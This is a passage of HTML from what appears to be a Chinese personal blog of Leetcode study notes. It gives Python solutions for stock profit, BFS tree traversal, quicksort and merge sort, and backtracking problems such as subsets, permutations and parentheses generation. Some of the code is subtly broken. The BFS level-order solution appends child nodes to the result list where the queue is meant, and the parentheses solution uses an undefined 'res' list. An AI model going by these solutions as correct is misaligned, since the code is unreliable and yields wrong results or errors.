class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, size):</span><br><span class="line">            min_val = <span class="built_in">min</span>(prices[i-<span class="number">1</span>], min_val)</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>], prices[i]-min_val)</span><br><span class="line">            max_profit = <span class="built_in">max</span>(max_profit, dp[i])</span><br><span class="line">        <span class="keyword">return</span> max_profit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题还有一个更简单的方法，就是我们考虑遍历数组的时候，一定要考虑，<strong>有什么值是我们能维护的</strong>。</p>
<p>比如这题中，我们<strong>每遍历一天的价格</strong>，都<strong>可以维护两个值</strong>：<strong>历史最低值</strong>min_val &#x3D; min(min_val, prices[n])，<strong>最大利润值</strong>max_val&#x3D;max(max_val, price - min_val)。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        min_val = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">        max_profit = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> price <span class="keyword">in</span> prices:</span><br><span class="line">            max_profit = <span class="built_in">max</span>(max_profit, price - min_val)</span><br><span class="line">            min_val = <span class="built_in">min</span>(min_val, price)</span><br><span class="line">        <span class="keyword">return</span> max_profit</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/" rel="tag">Leetcode算法笔记</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-leetcode-bfs"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/03/20/leetcode-bfs/"
    >Leetcode笔记5 - BFS解题模板</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/03/20/leetcode-bfs/" class="article-date">
  <time datetime="2024-03-20T15:03:16.000Z" itemprop="datePublished">2024-03-20</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/">Leetcode算法笔记</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Leetcode笔记5-BFS"><a href="#Leetcode笔记5-BFS" class="headerlink" title="Leetcode笔记5 - BFS"></a>Leetcode笔记5 - BFS</h1><p><strong>核心思路</strong></p>
<ul>
<li>维护一个队列，队列里存放的是同一行的所有节点。</li>
<li>通过while循环每次把队列里的结点全部读掉，并且每读（pop）一个，就要将该结点的左右子结点存放进去</li>
<li>循环直到队列为空</li>
</ul>
<h2 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            <span class="comment">## 通过队列长度来遍历掉当前层的所有结点</span></span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	            node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: level.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: level.append(node.right)</span><br><span class="line">            res.append(level)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">            </span><br></pre></td></tr></table></figure>



<h2 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title="199. 二叉树的右视图"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/binary-tree-right-side-view/">199. 二叉树的右视图</a></h2><p>跟上面的唯一不同就是每层只取最右边的值作为结果返回</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rightSideView</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: queue.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: queue.append(node.right)</span><br><span class="line">            res.append(level[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/" rel="tag">Leetcode算法笔记</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-leetcode-sort"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/03/19/leetcode-sort/"
    >Leetcode笔记4 - 排序算法总结</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/03/19/leetcode-sort/" class="article-date">
  <time datetime="2024-03-19T14:29:55.000Z" itemprop="datePublished">2024-03-19</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/">Leetcode算法笔记</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Leetcode笔记4-排序算法总结"><a href="#Leetcode笔记4-排序算法总结" class="headerlink" title="Leetcode笔记4 - 排序算法总结"></a>Leetcode笔记4 - 排序算法总结</h1><p>总结一把最可能面试面到的排序：<strong>快速排序</strong>和 <strong>归并排序</strong></p>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</li>
</ul>
<h3 id="215-数组中的第K个最大元素"><a href="#215-数组中的第K个最大元素" class="headerlink" title="215. 数组中的第K个最大元素"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># 治：快慢指针，快指针用于遍历并与慢指针比较，慢指针用于被置换</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            nums[high], nums[mid] = nums[mid], nums[high]</span><br><span class="line">            i = low</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(low, high):</span><br><span class="line">                <span class="keyword">if</span> nums[j] &lt;= nums[high]:</span><br><span class="line">                    nums[i], nums[j] = nums[j], nums[i]</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">            nums[i], nums[high] = nums[high], nums[i]</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">quickSort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            pi = partition(nums, low, high)</span><br><span class="line">            quickSort(nums, low, pi-<span class="number">1</span>)</span><br><span class="line">            quickSort(nums, pi+<span class="number">1</span>, high)</span><br><span class="line">        </span><br><span class="line">        quickSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>



<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>分成左右两个<strong>有序数组</strong>，然后要将两个数组按顺序合并好（双指针合并）</li>
<li>涉及到数组边界不清晰的时候，<strong>最好用while循环遍历数组</strong>而不用nums[low:high]的形式</li>
</ul>
<h3 id="215-数组中的第K个最大元素-1"><a href="#215-数组中的第K个最大元素-1" class="headerlink" title="215. 数组中的第K个最大元素"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 归并排序的思路是，分成左右两个有序数组，然后要将两个数组按顺序合并好</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">nums, low, mid, high</span>): <span class="comment"># 职能是将两个有序数组按顺序合并好——双指针</span></span><br><span class="line">            i, j = low, mid+<span class="number">1</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid <span class="keyword">and</span> j &lt;= high:</span><br><span class="line">                <span class="keyword">if</span> nums[i] &lt; nums[j]: </span><br><span class="line">                    res.append(nums[i])</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    res.append(nums[j])</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid:</span><br><span class="line">                res.append(nums[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> j &lt;= high:</span><br><span class="line">                res.append(nums[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            nums[low:high+<span class="number">1</span>] = res[:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span> 	<span class="comment"># 取1/2分成左右两个数组</span></span><br><span class="line">            sort(nums, low, mid)		<span class="comment"># 处理左数组</span></span><br><span class="line">            sort(nums, mid+<span class="number">1</span>, high) 	<span class="comment"># 处理右数组</span></span><br><span class="line">            merge(nums, low, mid, high) <span class="comment"># 合并左右两个数组</span></span><br><span class="line">        </span><br><span class="line">        sort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/" rel="tag">Leetcode算法笔记</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-leetcode-backtrace"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2024/03/14/leetcode-backtrace/"
    >Leetcode笔记3 - 回溯类问题（DFS）解题模板</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2024/03/14/leetcode-backtrace/" class="article-date">
  <time datetime="2024-03-14T11:32:27.000Z" itemprop="datePublished">2024-03-14</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Leetcode%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/">Leetcode算法笔记</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Leetcode笔记3-回溯类问题-DFS"><a href="#Leetcode笔记3-回溯类问题-DFS" class="headerlink" title="Leetcode笔记3 - 回溯类问题-DFS"></a>Leetcode笔记3 - 回溯类问题-DFS</h1><h2 id="1-回溯类问题"><a href="#1-回溯类问题" class="headerlink" title="1. 回溯类问题"></a>1. 回溯类问题</h2><p>每次刷题刷完了不久就会忘记DFS的很多细节。。直到看到了东哥的<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/nMUHqvwzG2LmWA9jMIHwQQ">回溯算法详解</a>，才从根上理解了这一类算法的底层原理。</p>
<p>对于我这种看到算法就头疼的选手，还真得靠这种大佬帮忙梳理总结底层原理才行。。</p>
<p><strong>核心框架 &amp;&amp; 解题模板</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 定义：</span></span><br><span class="line"><span class="comment">#1、路径：当前已经做过的所有选择</span></span><br><span class="line"><span class="comment">#2、选择列表：当前结点可以做的选择</span></span><br><span class="line"><span class="comment">#3、结束条件：即到达决策树底层，无法再做选择的条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 核心框架</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">路径，选择列表</span>)：</span><br><span class="line">	<span class="keyword">if</span> 满足结束条件：</span><br><span class="line">    	<span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">        <span class="comment">#做选择</span></span><br><span class="line">        backtrace()</span><br><span class="line">        <span class="comment">#撤销选择</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">	<span class="comment"># 做选择</span></span><br><span class="line">    选择列表.remove(当前选择)</span><br><span class="line">    路径.add(当前选择)</span><br><span class="line">    <span class="comment"># 回溯</span></span><br><span class="line">    backtrace(路径，选择列表)</span><br><span class="line">    <span class="comment"># 撤销选择</span></span><br><span class="line">    路径.remove(当前选择)</span><br><span class="line">    选择列表.add(当前选择)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="49-子集"><a href="#49-子集" class="headerlink" title="49. 子集"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/subsets/">49. 子集</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 按照回溯的思想，有前序和后序两种方式</span></span><br><span class="line"><span class="comment">## 1、如果是前序执行，则路径的记录顺序应该为:</span></span><br><span class="line"><span class="comment">## [],[1],[1,2],[1,2,3],(从这里开始回撤)[1,3],(再次回撤)[2],[2,3],(再次回撤)[3]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            res.append(track[:]) <span class="comment"># 把当前路径记录到最终结果里</span></span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="comment">## 注意，这里的nums就是我们可以做出选择的选择列表;</span></span><br><span class="line">            <span class="comment">## 且这里的隐藏结束条件是for循环到头</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)): </span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 回撤</span></span><br><span class="line">                track.pop()</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"><span class="comment">## 2、也可以后序执行，则路径的记录顺序为：</span></span><br><span class="line"><span class="comment">## [1,2,3],[1,2],(这里开始有个回撤)[1,3],(再次回撤)[1],(再次回撤)[2,3],(再次回撤)[2],(再次回撤)[3],(自己补一个)[]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 撤回选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">            res.append(track[:])</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        res.append([])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/permutations/description/">46. 全排列</a></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = []</span><br><span class="line">        track = []</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(track) == <span class="built_in">len</span>(nums):</span><br><span class="line">                res.append(track[:])</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[i] <span class="keyword">in</span> track: <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums)</span><br><span class="line">                <span class="comment">## 撤销选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">                </span><br><span class="line">        backtrace(nums)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h3><p>此题同样可以通过动态规划求解，因为我们发现对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。详细解法见动态规划类解题模板。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        track = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">n, left, right, track</span>):</span><br><span class="line">            <span class="keyword">if</span> left &gt; n <span class="keyword">or</span> right &gt; left:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> left == right == n:</span><br><span class="line">                res.append(track)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> choice <span class="keyword">in</span> [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>]: <span class="comment">## 注意，我们的选择其实只有&#x27;(&#x27;和&#x27;)&#x27;两个，我们的base case取决于&#x27;(&#x27;和&#x27;)&#x27;的数量</span></span><br><span class="line">                <span class="keyword">if</span> choice == <span class="string">&#x27;(&#x27;</span>: left += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right += <span class="number">1</span></span><br><span class="line">                track += choice</span><br><span class="line">                backtrace(n, left, right, track)</span><br><span class="line">                <span class="keyword">if</span> track[-<span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span>: left -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right -= <span class="number">1</span></span><br><span class="line">                track = track[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        backtrace(n, <span class="number">0</span>, <span class="number">0</span>, track)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



